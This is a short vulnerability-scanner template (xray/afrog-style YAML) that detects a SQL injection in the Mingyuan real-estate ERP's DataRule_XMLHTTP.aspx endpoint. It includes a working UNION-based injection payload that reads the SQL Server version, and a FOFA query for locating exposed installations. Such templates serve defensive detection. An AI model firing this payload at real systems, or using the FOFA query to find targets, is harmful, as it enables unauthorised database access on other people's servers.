id: mingyuanyun-erp-datarule-xmlhttp-sqli

info:
  name: 明源ERP-DataRule_XMLHTTP-存在SQL注入漏洞
  author: avic123
  severity: high
  verified: true
  description: |
    某源地产ERP系统 WebService服务针对客户端IP权限校验时,XMLHTTP接口出现SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息(例如管理员后台密码、站点用户个人信息,之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。
    FOFA: body="明源地产ERP" || body="用户登录-明源云ERP" || (body="明源云" && body="ERP") || body="/PubPlatform/Login/index.aspx"
  reference:
    - https://cn-sec.com/archives/3304116.html
  tags: mingyuanyun,erp,sqli
  created: 2025/08/25

set:
  hostname: request.url.host

rules:
  r0:
    request:
      method: GET
      path: /BUAdjust/DataRule/DataRule_XMLHTTP.aspx/?ywtype=getFieldXML&table=-1%27%20union%20select%20@@version--
    expression: >-
      response.status == 200 && response.body.bcontains(b"Microsoft SQL Server")

expression: r0()
